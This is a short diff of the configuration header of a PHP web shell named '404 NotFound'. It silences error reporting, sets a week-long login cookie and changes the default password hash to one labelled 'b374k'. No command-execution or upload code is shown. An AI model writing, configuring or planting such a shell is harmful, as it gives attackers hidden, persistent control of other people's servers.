@@ -10,7 +10,7 @@ error_reporting(0);
 $s_name = "404 NotFound"; // shell name
 $s_ver = "4dm1n"; // shell ver
 $s_title = $s_name." ".$s_ver; // shell title
-$s_pass = "4cfb8bed080144c335b03ba2e493f3e9"; // default : admin
+$s_pass = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // b374k
 $s_color = "6800d2"; // shell theme color, default : 4c83af
 $s_login_time = 3600 * 24 * 7; // cookie time (login)
 
